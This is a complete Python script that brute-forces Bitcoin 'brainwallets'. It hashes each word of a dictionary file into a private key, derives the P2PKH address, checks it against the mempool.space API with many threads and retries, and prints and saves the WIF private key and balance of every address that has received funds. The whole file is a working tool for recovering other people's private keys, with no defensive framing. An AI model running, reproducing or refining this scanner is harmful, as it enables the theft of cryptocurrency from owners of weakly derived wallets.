#!/usr/bin/env python3
"""
Fast P2PKH scanner using coincurve + mempool.space REST
Features:
    - Parallel derivation of addresses
    - Threaded HTTP workers
    - Atomic prints and optional quiet mode
    - Robust retry/backoff
Usage:
    python3 brute_p2pkh_final.py --dict dictionary.txt --out found.txt
Requirements:
    pip3 install coincurve requests base58
"""
from __future__ import annotations
import argparse, io, sys, os, time, logging, random, threading, queue
import binascii, hashlib
from typing import Tuple
import requests, base58
from coincurve import PrivateKey
from concurrent.futures import ThreadPoolExecutor

# ---------- crypto helpers ----------
def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def hash160(b: bytes) -> bytes:
    return hashlib.new('ripemd160', hashlib.sha256(b).digest()).digest()

def base58check_encode(prefix: bytes, payload20: bytes) -> str:
    raw = prefix + payload20
    checksum = hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
    return base58.b58encode(raw + checksum).decode()

def privhex_from_passphrase(passphrase: str) -> str:
    return binascii.hexlify(sha256(passphrase.encode('utf-8'))).decode()

def wif_from_privhex(priv_hex: str, compressed: bool = True) -> str:
    b = binascii.unhexlify(priv_hex)
    payload = b'\x80' + b
    if compressed:
        payload += b'\x01'
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return base58.b58encode(payload + checksum).decode()

def p2pkh_from_pubkey(pubkey_bytes: bytes) -> str:
    rip = hash160(pubkey_bytes)
    return base58check_encode(b'\x00', rip)

# ---------- derivation ----------
def derive_address(word: str) -> Tuple[str,str,str]:
    """
    Derives P2PKH address and WIF from passphrase
    Returns (word, addr, wif)
    """
    priv_hex = privhex_from_passphrase(word)
    pk = PrivateKey(bytes.fromhex(priv_hex))
    pub = pk.public_key.format(compressed=True)
    addr = p2pkh_from_pubkey(pub)
    wif = wif_from_privhex(priv_hex, compressed=True)
    return word, addr, wif

# ---------- mempool.space network helper ----------
def fetch_received_and_balance_mempool(session: requests.Session, addr: str, timeout: float = 15.0):
    """
    Returns (received_btc, balance_btc) using mempool.space /api/address/{addr}.
    Raises on HTTP or parse errors (retry/backoff handled by caller).
    """
    url = f"https://mempool.space/api/address/{addr}"
    r = session.get(url, timeout=timeout)
    r.raise_for_status()
    j = r.json()
    cs = j.get("chain_stats")
    if not isinstance(cs, dict):
        raise ValueError("Missing chain_stats in mempool response")
    funded = float(cs.get("funded_txo_sum", 0))
    spent  = float(cs.get("spent_txo_sum", 0))
    received_btc = funded / 1e8
    balance_btc = (funded - spent) / 1e8
    return received_btc, balance_btc

# ---------- HTTP worker ----------
def http_worker(worker_id: int, in_q: "queue.Queue[Tuple[str,str,str]]", out_file_path: str,
                rate_limit: float, api_delay: float,
                stop_event: threading.Event, stats: dict, print_lock: threading.Lock, quiet: bool):
    session = requests.Session()
    fout = None
    try:
        fout = open(out_file_path, "a", encoding="utf-8", buffering=1)
    except Exception as e:
        logging.error("Worker %d cannot open output file: %s", worker_id, e)
        stop_event.set()
        return

    while not stop_event.is_set():
        try:
            word, addr, wif = in_q.get(timeout=1.0)
        except Exception:
            if stop_event.is_set():
                break
            continue

        # politeness sleep + jitter
        if rate_limit:
            time.sleep(rate_limit + random.random() * 0.02)

        # fetch received and balance with retries
        max_retries = 4
        received = balance = 0.0
        for attempt in range(max_retries):
            try:
                received, balance = fetch_received_and_balance_mempool(session, addr)
                break
            except Exception as e:
                backoff = (0.5 + random.random()) * (2 ** attempt)
                logging.debug("Worker %d fetch error for %s: %s — retry %d sleeping %.2fs",
                              worker_id, addr, e, attempt+1, backoff)
                time.sleep(backoff)

        if received == 0.0:
            stats['checked'] += 1
            in_q.task_done()
            continue

        if api_delay:
            time.sleep(api_delay * (0.5 + random.random()))

        # LOUD OUTPUT and write
        try:
            if not quiet:
                with print_lock:
                    print("\n=== USED WALLET FOUND ===")
                    print(f"WORD: {word}")
                    print(f"ADDRESS (p2pkh): {addr}")
                    print(f"WIF: {wif}")
                    print(f"RECEIVED BTC: {received}")
                    print(f"CURRENT BALANCE BTC: {balance}")
                    print("========================\n")
            fout.write(f"{word},{addr},{wif},{received},{balance}\n")
            fout.flush()
            stats['found'] += 1
        except Exception:
            pass

        stats['checked'] += 1
        in_q.task_done()

    try:
        fout.close()
    except Exception:
        pass
    session.close()

# ---------- orchestrator ----------
def wait_futures(futures: set, q: "queue.Queue") -> Tuple[set,set]:
    """
    Checks which derivation futures are done, pushes results to HTTP queue
    Returns (done_futures_set, remaining_futures_set)
    """
    done_set = set()
    remaining = set()
    for f in futures:
        if f.done():
            try:
                word, addr, wif = f.result()
                q.put((word, addr, wif))
            except Exception:
                pass
            done_set.add(f)
        else:
            remaining.add(f)
    return done_set, remaining

def main():
    ap = argparse.ArgumentParser(description="Fast P2PKH scanner using coincurve + mempool.space")
    ap.add_argument("--dict", "-d", default="dictionary.txt")
    ap.add_argument("--out", "-o", default="found.txt")
    ap.add_argument("--http-threads", type=int, default=24)
    ap.add_argument("--deriv-threads", type=int, default=4)
    ap.add_argument("--chunk-size", type=int, default=2000)
    ap.add_argument("--rate-limit", type=float, default=0.0)
    ap.add_argument("--api-delay", type=float, default=0.0)
    ap.add_argument("--debug", action="store_true")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO,
                        format="%(asctime)s %(levelname)s %(message)s")

    # verify coincurve
    try:
        _ = PrivateKey(b'\x01' * 32)
    except Exception as e:
        logging.error("coincurve not available or failing: %s", e)
        sys.exit(1)

    # open dictionary
    try:
        fdict = io.open(args.dict, "rt", encoding="utf-8", errors="ignore")
    except Exception as e:
        logging.error("Cannot open dictionary: %s", e)
        sys.exit(1)

    q = queue.Queue(maxsize=args.http_threads * 4 + 1000)
    stop_event = threading.Event()
    stats = {'checked': 0, 'found': 0}
    print_lock = threading.Lock()

    # start HTTP workers
    workers = []
    for i in range(args.http_threads):
        t = threading.Thread(target=http_worker,
                             args=(i, q, args.out, args.rate_limit, args.api_delay, stop_event, stats, print_lock, args.quiet),
                             daemon=True)
        t.start()
        workers.append(t)

    # start derivation thread pool
    deriv_pool = ThreadPoolExecutor(max_workers=args.deriv_threads)
    futures = set()
    total = 0
    start = time.time()
    try:
        for raw in fdict:
            word = raw.strip()
            if not word:
                continue
            total += 1
            future = deriv_pool.submit(derive_address, word)
            futures.add(future)

            # push done futures to queue
            done, futures = wait_futures(futures, q)

            if total % args.chunk_size == 0:
                elapsed = time.time() - start
                rate = total / elapsed if elapsed > 0 else 0
                logging.info("Read %d words — queue size:%d — checked:%d found:%d — avg %.2f w/s",
                             total, q.qsize(), stats['checked'], stats['found'], rate)

        # wait for remaining derivation futures
        while futures:
            done, futures = wait_futures(futures, q)

        logging.info("Finished reading dictionary (%d words). Waiting for queue to drain...", total)
        q.join()
    except KeyboardInterrupt:
        logging.info("Interrupted by user — shutting down")
    finally:
        stop_event.set()
        deriv_pool.shutdown(wait=False)
        for t in workers:
            t.join(timeout=2.0)
        elapsed = time.time() - start
        logging.info("DONE. Total read: %d, checked: %d, found: %d, elapsed: %.1fs, avg %.2f w/s",
                     total, stats['checked'], stats['found'], elapsed, (total / elapsed if elapsed > 0 else 0))

if __name__ == "__main__":
    main()